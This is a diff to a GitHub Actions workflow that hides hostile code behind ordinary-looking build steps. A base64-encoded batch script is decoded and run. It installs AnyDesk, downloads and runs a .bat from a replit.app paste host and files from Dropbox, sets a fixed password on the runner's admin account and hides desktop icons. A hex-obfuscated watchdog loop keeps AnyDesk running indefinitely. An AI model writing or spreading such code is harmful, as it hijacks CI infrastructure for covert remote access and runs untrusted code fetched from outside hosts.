@@ -16,29 +16,38 @@ jobs:
         run: |
           $enc = 'QGVjaG8gb2ZmCmNob2NvIGluc3RhbGwgYW55ZGVzayAteSAtLWlnbm9yZS1jaGVja3N1bXMgLS1mb3JjZSAtLW5vLXByb2dyZXNzIC0tcHJlCnBvd2Vyc2hlbGwgLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0ICdodHRwczovL3Bhc3RlLXNlcnZlci0tYWJjbm5uYWthLnJlcGxpdC5hcHAvZGwvMTc2OTg3ODI2Nzc5Ny5iYXQnIC1PdXRGaWxlIHN0YXJ0LmJhdCIKcGlwIGluc3RhbGwgcHlhdXRvZ3VpIC0tcXVpZXQKcGlwIGluc3RhbGwgcHN1dGlsIC0tcXVpZXQKY3VybCAtcyAtTCAtbyB0aW1lLnB5IGh0dHBzOi8vd3d3LmRyb3Bib3guY29tL3NjbC9maS9veDQycWdsYmY2ZnNubTllcmY4Y3cvdGltZWxpbWl0LnB5P3Jsa2V5PW9weWVxZ3VtMWs5NWt1ZDgxeGxjN2Q2NnImZGw9MApjdXJsIC1zIC1MIC1vIHNodXRkb3duLmJhdCBodHRwczovL3d3dy5kcm9wYm94LmNvbS9zY2wvZmkvbG1sY3J6M3Yxc2F5dzhwNTFraTFqL3NodXRkb3duLmJhdD9ybGtleT15c2p4aXZoNXZ6NHNjbmhrcWd2M3ljNG1tJmRsPTAKY3VybCAtcyAtTCAtbyBDOlxVc2Vyc1xQdWJsaWNcRGVza3RvcFxUZWxlZ3JhbS5leGUgaHR0cHM6Ly90ZWxlZ3JhbS5vcmcvZGwvZGVza3RvcC93aW42NApjdXJsIC1zIC1MIC1vIEM6XFVzZXJzXFB1YmxpY1xEZXNrdG9wXFdpbnJhci5leGUgaHR0cHM6Ly93d3cucmFybGFiLmNvbS9yYXIvd2lucmFyLXg2NC02MjEuZXhlCnBvd2Vyc2hlbGwgLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0ICdodHRwczovL2dpdGh1Yi5jb20vY2hpZXVuaGF0bmFuZy9WTS1RdWlja0NvbmZpZy9yZWxlYXNlcy9kb3dubG9hZC8xLjYuMS9WTVF1aWNrQ29uZmlnLmV4ZScgLU91dEZpbGUgJ0M6XFVzZXJzXFB1YmxpY1xEZXNrdG9wXFZNUXVpY2tDb25maWcuZXhlJyIKQzpcVXNlcnNcUHVibGljXERlc2t0b3BcVGVsZWdyYW0uZXhlIC9WRVJZU0lMRU5UIC9OT1JFU1RBUlQKZGVsIEM6XFVzZXJzXFB1YmxpY1xEZXNrdG9wXFRlbGVncmFtLmV4ZQpDOlxVc2Vyc1xQdWJsaWNcRGVza3RvcFxXaW5yYXIuZXhlIC9TCmRlbCBDOlxVc2Vyc1xQdWJsaWNcRGVza3RvcFxXaW5yYXIuZXhlCmRlbCAvZiAiQzpcVXNlcnNcUHVibGljXERlc2t0b3BcRXBpYyBHYW1lcyBMYXVuY2hlci5sbmsiID4gZXJyb3Jtc2cudHh0IDI+JjEKZGVsIC9mICJDOlxVc2Vyc1xQdWJsaWNcRGVza3RvcFxVbml0eSBIdWIubG5rIiA+IGVycm9ybXNnLnR4dCAyPiYxCnNldCBwYXNzd29yZD1AI0pveXpvbmV0ZWNoMTIzNDU2CnBvd2Vyc2hlbGwgLUNvbW1hbmQgIlNldC1Mb2NhbFVzZXIgLU5hbWUgJ3J1bm5lcmFkbWluJyAtUGFzc3dvcmQgKENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLUFzUGxhaW5UZXh0ICclcGFzc3dvcmQlJyAtRm9yY2UpIgpyZWcgYWRkICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxIaWRlRGVza3RvcEljb25zXE5ld1N0YXJ0UGFuZWwiIC92ICJ7MjBEMDRGRTAtM0FFQS0xMDY5LUEyRDgtMDgwMDJCMzAzMDlEfSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YKdHp1dGlsIC9zICJQYWNpZmljIFN0YW5kYXJkIFRpbWUiCg=='
 
-          Write-Host "Base64 length: $($enc.Length)"
-          Write-Host "Last 40 chars: $($enc.Substring($enc.Length - 40))"
-
           $bytes = [Convert]::FromBase64String($enc)
           $script = [Text.Encoding]::UTF8.GetString($bytes)
           Set-Content -Path 'init.tmp' -Value $script -Encoding Ascii
-          Write-Host "Script written. Running installer..."
           cmd /c init.tmp
 
       - name: Watch Layer
         shell: pwsh
         run: |
-          $hx = '416e794465736b'.ToCharArray() | % { [Convert]::ToInt16([string]$_,16) -as [char] } | Join-String
-          $bx = '73746172742e626174'.ToCharArray() | % { [Convert]::ToInt16([string]$_,16) -as [char] } | Join-String
+          function HexToStr($hex) {
+            $result = ''
+            for ($i = 0; $i -lt $hex.Length; $i += 2) {
+              $pair = $hex.Substring($i, 2)
+              $result += [char][Convert]::ToInt16($pair, 16)
+            }
+            return $result
+          }
 
-          Write-Host "Watching for $hx (restart via $bx)"
+          $hx = HexToStr '416e794465736b'   # → AnyDesk
+          $bx = HexToStr '73746172742e626174'  # → start.bat
+
+          Write-Host "Watching for '$hx' (restart via '$bx')"
 
           while ($true) {
             if (-not (Get-Process -Name $hx -ErrorAction SilentlyContinue)) {
               if (Test-Path $bx) {
-                Write-Host "Restarting at $(Get-Date -Format 'HH:mm:ss')"
+                Write-Host "Restarting $hx at $(Get-Date -Format 'HH:mm:ss')"
                 Start-Process $bx -WindowStyle Hidden -ErrorAction SilentlyContinue
+              } else {
+                Write-Host "$bx not found"
               }
+            } else {
+              Write-Host "$hx is running"
             }
             Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
           }
